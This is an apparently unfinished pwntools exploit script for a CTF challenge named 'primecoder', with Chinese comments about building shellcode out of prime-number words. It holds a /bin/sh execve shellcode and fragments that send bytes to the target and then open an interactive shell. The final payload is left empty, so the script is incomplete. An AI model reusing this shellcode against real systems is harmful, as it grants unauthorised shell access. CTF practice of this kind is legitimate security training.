#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = process("./primecoder")
# r = remote("124.16.75.117", 51001)
shellcode_0 = b"\xf7\xe3\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


shellcode_1 = b"\x89\xe3\xc1\xe3\x05\xc1\xe3\x05\xc1\xe3\x05\xc1\xe3\x05\xc1\xe3\x05\xc1\xe3\x02\x53"
# mov ebx,esp
# shl ebx,32
# push ebx
shellcode_2 = b""
shellcode_3 = b"\x89\xe3\x89\xc1"
# mov ebx,esp
# mov ecx,eax
shellcode = b""

for i in range(len(shellcode)):
    if i == 0:
        print(r.sendafter(b"buffer", str(shellcode[i]) + "\n"))
        print(str(hex(shellcode[i])))

    else:
        print(r.sendafter(b"prime", str(shellcode[i]) + "\n"))
        print(str(hex(shellcode[i])))
r.interactive()
# 纯素数构造shellcode
# 这里的意思大概是
# 考虑输入时，每次为0x00000000-0xffffffff之间的一个数且必须占满字节
# 所有的输入拼凑起来构成shellcode
# 总长度不超过 0x100*0x4=1024字节
# 且每个四字节数必须为素数
# 这些个要求加起来有点点难绷
# 痛苦了一天
# 先这样吧
